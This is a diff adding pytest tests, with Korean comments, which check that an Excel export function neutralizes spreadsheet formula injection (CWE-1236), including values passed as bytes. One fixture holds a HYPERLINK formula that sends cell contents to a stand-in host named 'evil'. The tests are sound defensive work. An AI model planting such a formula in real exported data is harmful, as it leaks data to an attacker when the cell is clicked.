@@ -64,3 +64,46 @@ def test_export_korean_encoding(tmp_path):
     wb = load_workbook(filepath)
     ws = wb.active
     assert ws.cell(2, 1).value == "홍길동"
+
+
+def test_export_neutralizes_formula_injection(tmp_path):
+    # CWE-1236: 신뢰할 수 없는 수집 값이 엑셀에서 수식으로 실행되면 안 된다.
+    data = [{"제목": '=HYPERLINK("http://evil/?"&A2)', "값": "=1+1", "메모": "@SUM(1,2)"}]
+    filepath = str(tmp_path / "inj.xlsx")
+    export_to_excel(data, filepath)
+    ws = load_workbook(filepath).active
+    for col in (1, 2, 3):
+        c = ws.cell(2, col)
+        assert c.data_type != "f", f"col{col} 이 수식으로 저장됨"
+        assert str(c.value).startswith("'"), f"col{col} 이 텍스트로 중화되지 않음"
+
+
+def test_export_neutralizes_bytes_formula_injection(tmp_path):
+    # CWE-1236 (리뷰 보강): bytes 값도 openpyxl 이 문자열 수식 셀로 저장하므로 중화해야 한다.
+    # str 만 검사하던 중화를 b"=1+1" 가 우회해 수식으로 저장되던 경로.
+    data = [{"값": b"=1+1", "제목": b"@SUM(1,2)"}]
+    filepath = str(tmp_path / "bytes_inj.xlsx")
+    export_to_excel(data, filepath)
+    ws = load_workbook(filepath).active
+    for col in (1, 2):
+        c = ws.cell(2, col)
+        assert c.data_type != "f", f"col{col} 이 수식으로 저장됨(bytes 우회)"
+        assert str(c.value).startswith("'"), f"col{col} 이 텍스트로 중화되지 않음"
+
+
+def test_export_sanitize_opt_out_keeps_raw(tmp_path):
+    # 명시적으로 끄면 원본을 보존한다(신뢰 데이터 전용).
+    data = [{"값": "=1+1"}]
+    filepath = str(tmp_path / "raw.xlsx")
+    export_to_excel(data, filepath, sanitize_formulas=False)
+    assert load_workbook(filepath).active.cell(2, 1).data_type == "f"
+
+
+def test_export_normal_values_unaffected(tmp_path):
+    # 평범한 문자열·숫자는 중화 영향을 받지 않는다(회귀).
+    data = [{"상품명": "상품A", "가격": 10000}]
+    filepath = str(tmp_path / "ok.xlsx")
+    export_to_excel(data, filepath)
+    ws = load_workbook(filepath).active
+    assert ws.cell(2, 1).value == "상품A"
+    assert ws.cell(2, 2).value == 10000
